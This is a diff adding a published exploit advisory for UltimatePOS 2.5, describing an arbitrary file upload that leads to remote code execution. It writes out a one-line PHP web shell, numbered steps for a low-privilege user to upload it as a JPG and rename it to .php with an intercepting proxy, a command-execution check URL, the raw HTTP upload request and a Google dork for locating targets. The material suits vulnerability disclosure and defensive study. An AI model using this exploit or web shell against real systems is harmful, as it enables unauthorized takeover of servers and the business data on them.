@@ -1,0 +1,64 @@
+# Exploit Title: UltimatePOS 2.5 - Remote Code Execution
+# Google Dork: intext:"UltimatePOS" 
+# Date: 2018-08-22
+# Exploit Author: Renos Nikolaou
+# Vendor Homepage: http://ultimatefosters.com/
+# Software Link: https://codecanyon.net/item/saas-superadmin-module-for-ultimatepos-advance/22394431
+# Version: 2.5
+# Tested on: Windows 10
+# CVE: N/A
+# Description : UltimatePOS 2.5 allows users to upload arbitrary files which 
+# leads to a remote command execution on the remote server.
+
+# PoC
+# 1) Create a file with the below PHP code and save it as jpg
+
+<?php $cmd=$_GET['cmd']; system($cmd); ?>
+
+# 2) Login to UltimatePOS portal as low priviliage user
+# 3) At the left hand side go to Products --> List Products ( http://domain/products )
+# 4) Click at the Actions button of a current product --> Edit
+# (NOTE: Attack works if you add new product as well)
+# 5) Under Product image: click Browse and upload your jpg file containing the PHP code mentioned at step 1. 
+# (Make sure to use proxy like Burp, Fiddler etc..etc)
+# 6) Scroll Down, click Update and Intercept the request using proxy
+# 7) Forward the requests until you reach the from request containing the product details 
+# (See the request below) including the filename of the file that you have uploaded.
+# 8) Edit the filename from filename.jpg to filename.php and then release the Interception.
+# 9) Go to the List Products again (Step 3) and fine the product that you have edited.
+# 10) Right click at the Product image and select Copy image Location
+# 11) Paste the URL into your browser. Will be similar to: http://domain/storage/img/1533988576_cmd.php
+# 12) Verify the exploit: http://domain/storage/img/1533988576_cmd.php?cmd=id
+
+
+# The request:
+===================
+
+POST /products/64 HTTP/1.1
+Host: domain.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://domain.com/products/64/edit
+Cookie: 
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: multipart/form-data; boundary=---------------------------3062816822434
+Content-Length: 2868
+
+...
+
+50
+-----------------------------3062816822434
+Content-Disposition: form-data; name="image"; filename="cmd.php"
+Content-Type: image/jpeg
+
+<?php $cmd=$_GET['cmd']; system($cmd); ?>
+
+-----------------------------3062816822434
+Content-Disposition: form-data; name="weight"
+
+pos_confirmed.PNG
+
+...
